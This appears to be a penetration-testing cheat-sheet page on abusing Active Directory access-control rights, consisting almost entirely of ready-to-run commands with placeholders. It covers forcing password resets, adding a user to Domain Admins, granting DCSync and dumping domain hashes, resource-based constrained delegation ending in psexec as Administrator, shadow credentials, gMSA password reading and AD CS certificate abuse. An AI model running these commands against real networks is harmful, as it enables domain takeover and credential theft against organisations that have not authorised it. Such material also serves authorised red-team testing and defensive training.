---
title: AD ACL / ACE Abuse
category: active-directory
description: GenericAll, WriteDacl, ForceChangePassword, AddMember and friends.
tags: [ad, acl, ace, bloodhound]
os: [any]
order: 40
---

## Find abusable rights

BloodHound queries:

```text
MATCH p=(u:User {owned:true})-[r:GenericAll|GenericWrite|WriteDacl|WriteOwner|AddMember|ForceChangePassword|AllExtendedRights]->(t) RETURN p
```

PowerView:

```powershell
Get-DomainObjectAcl -Identity * -ResolveGUIDs |
  ? {$_.SecurityIdentifier -match "$(Get-DomainGroup 'Domain Users' -Properties objectsid).objectsid"} |
  Format-List
```

## ForceChangePassword

```bash
# Linux
net rpc password "victim" 'NewPass1!' -U "{{DOMAIN}}/{{USER}}%pass" -S {{RHOST}}
# Or
bloodyAD -d {{DOMAIN}} -u "{{USER}}" -p 'pass' --host {{RHOST}} set password victim 'NewPass1!'
```

```powershell
# Windows
$pw = ConvertTo-SecureString 'NewPass1!' -AsPlainText -Force
Set-DomainUserPassword -Identity victim -AccountPassword $pw
```

## AddMember (GenericWrite on group)

```bash
bloodyAD -d {{DOMAIN}} -u "{{USER}}" -p 'pass' --host {{RHOST}} add groupMember "Domain Admins" {{USER}}
net rpc group addmem "Domain Admins" {{USER}} -U "{{DOMAIN}}/{{USER}}%pass" -S {{RHOST}}
```

## WriteDacl → GenericAll → DCSync

Grant yourself DCSync rights on the domain:

```powershell
Add-DomainObjectAcl -TargetIdentity "DC=corp,DC=local" -PrincipalIdentity {{USER}} -Rights DCSync
```

```bash
impacket-secretsdump -just-dc {{DOMAIN}}/{{USER}}:'pass'@dc.{{DOMAIN}}
```

## WriteOwner

```powershell
Set-DomainObjectOwner -Identity victim -OwnerIdentity {{USER}}
Add-DomainObjectAcl -TargetIdentity victim -PrincipalIdentity {{USER}} -Rights All
```

## RBCD (GenericWrite/WriteProperty on computer)

```bash
impacket-addcomputer -computer-name 'attacker$' -computer-pass 'Pwn123!' -dc-ip {{RHOST}} {{DOMAIN}}/{{USER}}:'pass'
impacket-rbcd -delegate-from 'attacker$' -delegate-to 'VICTIM$' -dc-ip {{RHOST}} -action write {{DOMAIN}}/{{USER}}:'pass'
impacket-getST -spn cifs/victim.{{DOMAIN}} -impersonate Administrator -dc-ip {{RHOST}} {{DOMAIN}}/attacker\$:'Pwn123!'
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass victim.{{DOMAIN}}
```

## Shadow Credentials (msDS-KeyCredentialLink)

```bash
certipy-ad shadow auto -username "{{USER}}@{{DOMAIN}}" -password 'pass' -account victim -dc-ip {{RHOST}}
```

## ReadGMSAPassword

```bash
nxc ldap {{RHOST}} -u "{{USER}}" -p 'pass' --gmsa
bloodyAD -d {{DOMAIN}} -u "{{USER}}" -p 'pass' --host {{RHOST}} get object 'gmsa$' --attr msDS-ManagedPassword
```

## AD CS (ESC1-8) — quick scan

```bash
certipy-ad find -u "{{USER}}@{{DOMAIN}}" -p 'pass' -dc-ip {{RHOST}} -vulnerable -stdout
certipy-ad req -u "{{USER}}@{{DOMAIN}}" -p 'pass' -ca CORP-CA -template VulnTemplate -upn Administrator@{{DOMAIN}}
certipy-ad auth -pfx administrator.pfx -dc-ip {{RHOST}}
```
